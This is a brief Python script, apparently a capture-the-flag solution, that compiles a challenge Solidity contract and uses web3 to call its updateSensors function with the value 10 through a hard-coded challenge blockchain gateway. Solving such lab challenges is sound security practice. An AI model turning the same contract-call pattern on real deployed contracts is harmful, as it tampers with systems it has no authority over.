#https://ctftime.org/writeup/36492

from web3 import Web3
from solcx import compile_source, install_solc

# installs solc compiler, necessary only for first execution
install_solc("0.8.18")

# compiles source code to get the contract abi
with open("Unknown.sol", "rt") as fp:
    src = fp.read()
compiled = compile_source(src, output_values=["abi"])
contract_id, contract_interface = compiled.popitem()
abi = contract_interface['abi']

# contract adress (given in the tcp interface)
target = '0x612DC3AebddE1E9CBc1a608a0E126F54c5988376'

w3 = Web3(Web3.HTTPProvider("http://104.248.169.177:32181")) # blockchain gateway from tcp interface
contract = w3.eth.contract(address=target, abi=abi)
contract.functions.updateSensors(10).transact() # calls update sensor with value of 10
